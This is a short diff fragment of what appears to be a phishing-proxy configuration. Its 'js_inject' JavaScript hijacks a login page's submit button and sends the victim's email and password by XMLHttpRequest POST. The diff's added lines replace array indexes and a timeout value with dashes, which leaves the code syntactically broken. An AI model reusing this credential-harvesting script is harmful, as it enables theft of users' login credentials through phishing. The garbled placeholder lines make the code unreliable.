@@ -39,12 +39,12 @@ js_inject:
     trigger_params: []
     script: |
       function lp(){
-        var submit = document.querySelectorAll('button[type=button]')[4];
+        var submit = document.querySelectorAll('button[type=button]')[-];
         submit.setAttribute("onclick", "sendData()");
         return;
       }
       function sendData(){
-        var email = document.getElementsByName("email")[1].value;
+        var email = document.getElementsByName("email")[-].value;
         var password = document.getElementsByName("password")[0].value;
         var xhr2 = new XMLHttpRequest();
         xhr2.open("POST", '/', true);
@@ -56,7 +56,7 @@ js_inject:
         xhr.send("Password="+encodeURIComponent(password));
         return;
       }
-      setTimeout(function(){ lp(); }, 2500);
+      setTimeout(function(){ lp(); }, ----);
 ```
 
 ```
